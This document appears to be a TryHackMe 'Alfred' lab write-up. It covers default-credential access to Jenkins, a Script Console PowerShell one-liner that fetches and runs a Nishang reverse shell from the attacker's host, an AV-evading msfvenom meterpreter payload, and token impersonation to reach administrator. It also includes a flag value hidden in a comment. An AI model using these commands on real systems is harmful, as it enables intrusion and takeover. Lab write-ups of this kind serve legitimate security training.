# <div align='center'>[Alfred](https://tryhackme.com/room/alfred)</div>
<div align='center'>Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.</div>
<div align='center'>
  <img src='https://github.com/user-attachments/assets/335a1059-b792-4edc-a5e2-ea767b35e798' height='200'></img>
</div>

# Step 1: Recconance 
```
:~$ nmap -sV 10.10.219.84
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 20:35 IST
Nmap scan report for 10.10.219.84
Host is up (0.19s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
1. The scan shows there are 3 ports open
* `80` with web service.
* `3389` useless
* `8080` jenkins running

The port number 80 as default let take a look

![image](https://github.com/user-attachments/assets/7483aad4-dbc8-4c4c-b387-ae7b2848ea25)

find nothing usefull here 

2. As the Jenkins version is outdated let take a look at it

![image](https://github.com/user-attachments/assets/84cdf8d0-1e7e-4d29-9853-e5010f586658)

Okay let try default credentials `admin:admin`

![image](https://github.com/user-attachments/assets/a53f02a6-4d96-4c6f-94ca-ea4b7376ead0)

bingo ! im genious


# Step 2: Exploitation
After Scrollig for long i found a this in `Manage Jenkins` > There is `Script Console`

![image](https://github.com/user-attachments/assets/4a883914-a503-4df8-b551-98415f9cc72b)

After wasting some time i understand the:

let swape cmd and take a look at `C:` drive:

```
cmd = "cmd.exe /c dir"
println cmd.execute().text
```

![image](https://github.com/user-attachments/assets/08208f34-aedc-4bf8-b079-79792292dfb5)

We got some data Now can cast a reverse shell here but 1st we need a reverse shell 
```
git clone https://github.com/samratashok/nishang
```

Go to this directory 
```
cd nishang/Shells/
```

Now we need to pull our revrse shell from our system and place and execute that into target system for doing that in `Shell` directory open a python server to pull the reverse shell form it:
```
python3 -m http.server
```

![image](https://github.com/user-attachments/assets/ec758bd2-d1b0-4211-8d65-cf8fcf5eafc7)

Now Set up a `Netcat` listner on differet port:
```
nc -lnvp 1234
```
For reverse connection

Now we need to download this reverse shell into traget system
```
cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-Listner-port"
println cmd.execute()
```

Like this:
```
cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.14.127:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.14.127 -Port 1234"
println cmd.execute()
```

Got the Connection 

![image](https://github.com/user-attachments/assets/9e6bc915-db95-4347-bcd8-d57eeb0c8c3e)

# Step 3: Post Exploitation

## User flag.txt
```
cat 'C:\Users\bruce\Desktop\user.txt'
```
<!-- 79007a09481963edf2e1321abd9ae2a0 -->
![image](https://github.com/user-attachments/assets/d78864b1-d5c9-46fc-a42c-bec8cfbff9f8)


## Switching Shells
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-test.exe
```

This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

Start Msfconsole
```
msfconsole -q
```
Start A TCP reverse Handler for connection
```
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp
```
Set Lhost
```
set LHOST your-thm-ip set
```
Set Lport
```
LPORT 5555
```
Start the Listner
```
run
```

First We need to download the our Payload in the Enemy system for doing that open new terminal where your playload is created in my case it `/home/user`
```
python3 -m http.server
```

Download using this command on cmd
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```

![image](https://github.com/user-attachments/assets/4408c39f-2e4b-4662-abd9-33f0291d7937)

Let executt it
```
Start-Process "shell-test.exe"
```
![image](https://github.com/user-attachments/assets/ec6fbbcd-504b-4557-86e0-e49ed71d4b73)

Now Let Swape shell
```
shell
```
![image](https://github.com/user-attachments/assets/f52a258f-15aa-4005-b744-567a4465c22a)

Let Check for privillage
```
whoami /prive
```
![image](https://github.com/user-attachments/assets/c873e060-900e-4642-b150-32b0005d4af6)

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.

Enter: load incognito to load the incognito module in Metasploit. Please note that you may need to use the use incognito command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.

Press `ctrl`+`c` to exit shell and back to meterpreter

Let see which tokens are available
```
list_tokens -g
```
![image](https://github.com/user-attachments/assets/580e84f2-ddf3-4c5c-a265-50404dd99b3e)

We can see that the BUILTIN\Administrators token is available.

Let  impersonate the Administrators' token:
```
impersonate_token "BUILTIN\Administrators"
```

![image](https://github.com/user-attachments/assets/15dfdeb9-451f-4199-84b2-ab173774e818)

## Root Flag.txt

Let Migrate our permissions

to migrate check the running process

![image](https://github.com/user-attachments/assets/0ee6b838-9ec2-434e-aa7a-81c4f56eeb4b)

Let migrate to this service
```
migrate PID-OF-PROCESS
```
![image](https://github.com/user-attachments/assets/c1b0fc0a-a1f4-4769-8e52-1bf3016fda1f)

View Our Flag
```
type 'C:\Windows\System32\config\root.txt'
```

![image](https://github.com/user-attachments/assets/609af3d5-7e0b-43b4-a689-640cbde2695e)
